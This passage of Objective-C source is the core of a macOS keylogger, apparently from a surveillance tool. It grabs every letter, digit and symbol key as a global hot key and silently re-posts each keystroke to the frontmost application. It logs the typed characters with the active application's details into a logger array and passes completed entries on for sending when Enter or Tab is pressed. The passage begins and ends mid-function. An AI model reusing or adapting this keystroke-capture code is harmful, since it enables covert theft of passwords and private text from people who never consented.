    OSStatus error = GetEventParameter(aEvent,kEventParamDirectObject,typeEventHotKeyID,NULL, sizeof(EventHotKeyID),NULL,&hotKeyID);
    //DLog(@"hotKeyID.id = %d, error = %d", (unsigned int)hotKeyID.id, (int)error);
    
    int eCase = hotKeyID.id;
    CGEventSourceRef source = CGEventSourceCreate(kCGEventSourceStatePrivate);
    CGEventRef keyDown = nil;
    
    NSEvent * eventID = [NSEvent eventWithEventRef:aEvent];
    
    if ([eventID modifierFlags] & NSAlphaShiftKeyMask) {
        //DLog(@"isCaplockOn");
        isCapLockActive = true;
    }
    
    switch (eCase) {
        case 1:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_A, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 2: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_B, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 3: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_C, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 4: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_D, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 5: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_E, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 6: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_F, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 7: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_G, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 8: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_H, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 9: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_I, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 10: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_J, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 11: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_K, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 12: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_L, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 13: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_M, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 14: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_N, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 15: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_O, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 16: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_P, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 17: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Q, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 18: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_R, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 19: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_S, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 20: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_T, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 21: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_U, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 22: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_V, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 23: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_W, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 24: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_X, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 25: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Y, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 26: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Z, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 27: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Equal, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 28: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Minus, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 29: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_RightBracket, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 30: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_LeftBracket, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 31: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Quote, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 32: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Semicolon, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 33: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Backslash, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 34: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Comma, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 35: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Slash, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 36: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Period, TRUE);
            if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 37: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Grave, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 38: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadDecimal, TRUE);
            break;
        case 39: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadMultiply, TRUE);
            break;
        case 40: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadPlus, TRUE);
            break;
        case 41: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadClear, TRUE);
            symbol = @"[Clear]";
            break;
        case 42: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadDivide, TRUE);
            break;
        case 43: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_Space, TRUE);
            symbol = @"[Space]";
            break;
        case 44: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadMinus, TRUE);
            break;
        case 45: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadEquals, TRUE);
            break;
        case 46: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad0, TRUE);
            break;
        case 47: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad1, TRUE);
            break;
        case 48: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad2, TRUE);
            break;
        case 49: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad3, TRUE);
            break;
        case 50: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad4, TRUE);
            break;
        case 51: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad5, TRUE);
            break;
        case 52: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad6, TRUE);
            break;
        case 53: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad7, TRUE);
            break;
        case 54: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad8, TRUE);
            break;
        case 55:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Keypad9, TRUE);
            break;
        case 56: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_0, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 57: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_1, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 58:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_2, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 59: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_3, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 60:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_4, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 61: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_5, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 62: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_6, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 63:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_7, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 64: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_8, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;
        case 65: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_9, TRUE);
            //if (isCapLockActive) { CGEventSetFlags(keyDown, kCGEventFlagMaskShift); }
            break;  
        case 66:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_A, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 67:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_B, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 68: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_C, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 69: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_D, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 70: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_E, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 71: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_F, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 72: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_G, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 73: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_H, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 74: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_I, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 75: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_J, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 76: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_K, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 77: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_L, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 78: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_M, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 79: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_N, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 80: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_O, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 81: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_P, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 82: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Q, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 83: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_R, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 84: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_S, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 85: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_T, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 86: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_U, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 87: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_V, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 88: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_W, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 89: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_X, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 90: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Y, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 91: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Z, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 92: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Equal, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 93: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Minus, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 94: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_RightBracket, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 95: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_LeftBracket, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 96: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Quote, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 97: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Semicolon, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 98: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Backslash, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 99: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Comma, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 100: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Slash, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 101: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Period, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 102: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_Grave, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 103: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_0, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 104: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_1, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 105: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_2, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 106: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_3, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 107: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_4, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 108: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_5, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 109: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_6, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 110: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_7, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 111: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_8, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
        case 112: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_9, TRUE);
            CGEventSetFlags(keyDown, kCGEventFlagMaskShift);
            break;
            // 
        case 200: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_ANSI_KeypadEnter, TRUE);
            enterpress = true;
            symbol = @"[Num Enter]";
            break;
            // 
        case 201: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_Return, TRUE);
            enterpress = true;
            symbol = @"[Enter]";
            break;
            // 
        case 202: 
            keyDown = CGEventCreateKeyboardEvent(source, kVK_Tab, TRUE);
            enterpress =true;
            symbol = @"[Tab]";
            break;
            // 
        case 203:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_Delete, TRUE);
            //enterpress = true;
            shouldRepeat = YES;
            symbol = @"[Delete]";
            break; 
        case 204:
            keyDown   = CGEventCreateKeyboardEvent(source, kVK_Shift, TRUE);
            symbol = @"[Shift]";
            break;
        case 205:
            keyDown = CGEventCreateKeyboardEvent(source, kVK_RightShift, TRUE);
            symbol = @"[Right Shift]";
            break;
        case 206:
            shouldRepeat = YES;
            keyDown = CGEventCreateKeyboardEvent(source, kVK_RightArrow, TRUE);
            symbol = @"[Right]";
            break;
        case 207:
            shouldRepeat = YES;
            keyDown = CGEventCreateKeyboardEvent(source, kVK_LeftArrow, TRUE);
            symbol = @"[Left]";
            break;
        case 208:
            shouldRepeat = YES;
            keyDown = CGEventCreateKeyboardEvent(source, kVK_UpArrow, TRUE);
            symbol = @"[Up]";
            break;
        case 209:
            shouldRepeat = YES;
            keyDown = CGEventCreateKeyboardEvent(source, kVK_DownArrow, TRUE);
            symbol = @"[Down]";
            break;
        default:
            shouldPost = NO;
            break;
    }

    if(shouldPost){
        NSEvent * temp_event = nil;
        if ([self isExceptApplication]) {
            temp_event = [NSEvent eventWithCGEvent:keyDown];
            keyDown = nil;
            keyDown = [self generateNewKeyEventPressedWith:eCase isCaplockActivce:isCapLockActive source:source];
        }

        ProcessSerialNumber psn;
        //if (GetFrontProcess( &psn ) != noErr) { DLog(@"Error to GetFrontProcess"); }
        
        //psn = [self activePSN];
        //psn = [self frontMostPSN];
        psn = [self frontMostPSNV2];
        
        CGEventPostToPSN(&psn, keyDown);
        
        NSDictionary *activeAppInfo = [[NSWorkspace sharedWorkspace]activeApplication];
        NSEvent *event = nil;
        
        if ( temp_event ) {
            event = temp_event;
        }else{
            event = [NSEvent eventWithCGEvent:keyDown];
        }
        
        if ([[activeAppInfo allKeys] count ]> 0) {
            NSThread *threadA = [NSThread currentThread];
            //dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ // Concurrent queue
            //dispatch_async(dispatch_get_main_queue(), ^{ // Serial queue on main thread
            dispatch_async(queue_serial_keyboardlogger, ^{ // Serial queue on non-main thread
                NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
                //DLog(@"Keylogger thread process key: %d", [NSThread currentThread].isMainThread);
                NSString * characters = [event characters];
                if ([symbol length] > 0) {
                    if (![symbol isEqualToString:@"[Space]"]) {
                        characters = @"";
                    }
                }
                NSMutableDictionary *keyInfo = [KeyboardLoggerUtils getKeyInfoWithKeyString:characters rawKeyRep:symbol activeAppInfo:activeAppInfo psn:psn];
                if (keyInfo) {
                    @synchronized (self.mLoggerArray) {
                        NSMutableDictionary *previousKeyInfo = [KeyboardLoggerUtils getPreviousKeyInfoWithArray:self.mLoggerArray byNewKeyInfo:keyInfo];
                        if (previousKeyInfo) {
                            NSMutableDictionary *newKeyInfo = [KeyboardLoggerUtils mergeKeyInfo:previousKeyInfo withKeyInfo:keyInfo];
                            [self.mLoggerArray removeObject:previousKeyInfo];
                            [self.mLoggerArray insertObject:newKeyInfo atIndex:0];
                        } else {
                            [self.mLoggerArray insertObject:keyInfo atIndex:0];
                        }
                    }

                    if (enterpress) {
                        NSNumber *code = [NSNumber numberWithInteger:kKeyboardLoggerCompleteCodeTerminateKey];
                        NSDictionary *userInfo = [NSDictionary dictionaryWithObjectsAndKeys:code, @"code", symbol, @"object", nil];
                        [self performSelector:@selector(sendKey:) onThread:threadA withObject:userInfo waitUntilDone:NO];
                    }
                }
                [pool release];
            });
        }
        
        //========= Repeat
        if (shouldRepeat) {
            self.mKeyHold = [NSMutableArray array];
            [self.mKeyHold addObject:(id)keyDown];
            
            NSArray *args = [NSArray arrayWithObjects:(id)keyDown, symbol, nil];
            [NSObject cancelPreviousPerformRequestsWithTarget:self];
            [self performSelector:@selector(prepareAutorepeat:) withObject:args afterDelay:0.3];
        }

    }

    if (keyDown) CFRelease(keyDown);
    if (source) CFRelease(source);
}

#pragma mark Exception Application Shift

-(BOOL) isExceptApplication {
    if ([[KeyboardLoggerUtils getCurrentAppID]isEqualToString:@"com.microsoft.rdc.mac"]) {
        return YES;
    }else{
        return NO;
    }
}

-(CGEventRef) generateNewKeyEventPressedWith:(int) aCase isCaplockActivce:(BOOL) aIsCapLockActive source:(CGEventSourceRef) aSource {
    CGEventRef key = nil;
    switch(aCase){
        case 1:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_A, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 2:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_B, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 3:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_C, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 4:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_D, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 5:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_E, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 6:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_F, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 7:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_G, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 8:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_H, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 9:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_I, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 10:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_J, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 11:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_K, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 12:
            key= CGEventCreateKeyboardEvent(aSource, kVK_ANSI_L, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 13:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_M, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 14:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_N, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 15:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_O, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 16:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_P, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 17:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Q, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 18:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_R, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 19:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_S, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 20:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_T, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 21:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_U, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 22:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_V, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 23:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_W, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 24:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_X, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 25:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Y, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 26:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Z, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 27:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Equal, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 28:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_Minus, TRUE);
            if (aIsCapLockActive) { CGEventSetFlags(key, kCGEventFlagMaskAlphaShift); }
            break;
        case 29:
            key = CGEventCreateKeyboardEvent(aSource, kVK_ANSI_RightBracket, TRUE);
